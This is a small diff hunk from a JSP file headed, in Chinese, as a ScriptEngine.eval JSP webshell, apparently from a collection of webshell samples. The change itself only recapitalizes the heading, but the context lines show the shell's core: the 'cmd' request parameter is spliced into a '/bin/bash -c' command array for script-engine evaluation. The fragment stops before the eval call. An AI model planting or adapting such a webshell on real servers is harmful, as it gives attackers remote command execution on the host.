@@ -5,7 +5,7 @@
 <%@ page import="java.io.InputStreamReader" %>
 <html>
 <body>
-<h2>ScriptEngine.eval的JSP Webshell</h2>
+<h2>ScriptEngine.eval的JSP WebShell</h2>
 <%
     String s1 = "s=[3];s[0]='/bin/bash';s[1]='-c';s[2]='";
     String s2 = request.getParameter("cmd");
